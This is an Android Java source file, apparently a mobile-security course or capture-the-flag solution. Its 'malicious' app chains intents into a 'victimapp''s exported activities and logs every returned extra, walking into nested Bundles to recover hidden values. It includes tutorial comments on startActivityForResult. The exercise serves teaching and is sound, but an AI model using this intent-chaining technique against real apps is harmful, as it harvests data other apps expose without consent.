package com.example.maliciousapp3;

import androidx.annotation.Nullable;
import androidx.appcompat.app.AppCompatActivity;

import android.content.ComponentName;
import android.content.Intent;
import android.os.Bundle;
import android.util.Log;

import java.util.Iterator;

public class MainActivity extends AppCompatActivity {

    private static final String TAG = "MOBIOTSEC";

    // Add a different request code for every activity you are starting from here
    private static final int FIRST_ACTIVITY_REQUEST_CODE = 1;
    private static final int SECOND_ACTIVITY_REQUEST_CODE = 2;
    private static final int THIRD_ACTIVITY_REQUEST_CODE = 3;
    private static final int FOURTH_ACTIVITY_REQUEST_CODE = 4;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
    }

    @Override
    protected void onStart() {
        super.onStart();

        // Part One
        Intent intent = new Intent();
        // intent.setComponent(new ComponentName("package name", "fully-qualified name of activity"))
        intent.setComponent(new ComponentName("com.example.victimapp","com.example.victimapp.PartOne"));
        if ( intent.resolveActivity(getPackageManager()) != null){ // resolveActivity(PackageManager pm) --> Return the Activity component that should be used to handle this intent.
                                                                    // If multiple activities are found to satisfy the intent, the one with the highest priority will be used. If there are multiple activities with the same priority, the system will either pick the best activity based on user preference, or resolve to a system class that will allow the user to pick an activity and forward from there.
            startActivityForResult(intent, FIRST_ACTIVITY_REQUEST_CODE); //startActivityForResult(android.content.Intent, int, android.os.Bundle)
        }
    // startActivity vs startActivityForResult
        // startActivity
            // Start an activity, like you would start an application: for instance: you have an app with a home-screen and a user-info screen: if you press the user-info button, you start the user-info activity with this.
        // startActivityForResult --> startActivityForResult(android.content.Intent, int, android.os.Bundle) //Intent: The intent to start.//requestCode --> int: If >= 0, this code will be returned in onActivityResult() when the activity exits.
            // Start an activity and expect something in return. For instance, on your user-info screen, you can upload a profile picture. You start the gallery-activity with the explicit goal to get a URI back with the preferred picture. You start this activity literaly to obtain a result (the picture. There are some techinical ways to make sure you actually get the result, but they are quite clear in the manual.

        //Activities are registered in the manifest. The OS basically has a database of all registered activities and their <intent-filter> details, and it uses that database to find candidates for any given implicit Intent.
    }

    @Override
    protected void onActivityResult(int requestCode, int resultCode, @Nullable Intent data) {
        super.onActivityResult(requestCode, resultCode, data);
//        Log.i(TAG, "requestCode: " + requestCode);
//        Log.i(TAG, "resultCode: " + resultCode);
//        Log.i(TAG, "IntentData: " + data);

                        //data is an intent
        Bundle bundle = data.getExtras(); //  Android Bundle is used to pass data between activities. The values that are to be passed are mapped to String keys which are later used in the next activity to retrieve the values.
        for (String p : bundle.keySet()) {
            Log.i(TAG, "key: " + p + " value: " + bundle.get(p));
        }


        if(resultCode == FIRST_ACTIVITY_REQUEST_CODE){
            Intent intent2 = new Intent("com.example.victimapp.intent.action.JUSTASK");
            if (intent2.resolveActivity(getPackageManager()) != null) {
                startActivityForResult(intent2, SECOND_ACTIVITY_REQUEST_CODE);
            }
        } else if (resultCode == SECOND_ACTIVITY_REQUEST_CODE){
            Intent intent3 = new Intent();
            intent3.setComponent(new ComponentName("com.example.victimapp","com.example.victimapp.PartThree"));
            if (intent3.resolveActivity(getPackageManager()) != null){
                startActivityForResult(intent3, THIRD_ACTIVITY_REQUEST_CODE);
            }
        } else if (resultCode == THIRD_ACTIVITY_REQUEST_CODE){
            Intent intent4 = new Intent("com.example.victimapp.intent.action.JUSTASKBUTNOTSOSIMPLE");
            if(intent4.resolveActivity(getPackageManager()) != null){
                startActivityForResult(intent4, FOURTH_ACTIVITY_REQUEST_CODE);
            }
        } else if (resultCode == FOURTH_ACTIVITY_REQUEST_CODE){
            Bundle b = data.getExtras();
            Iterator i = b.keySet().iterator();
            while(i.hasNext()){
                String key = i.next().toString();
                String value = b.get(key).toString();
                Log.i(TAG, "key: " + key + " value: " + b.get(key).toString());
                if(b.get(key) instanceof Bundle){
                    try {
                        b = (Bundle) b.get(key);
                        i = b.keySet().iterator();
                    } catch (Exception e) {
                       Log.i(TAG, e.toString());
                    }
                }
            }
        }
    }
}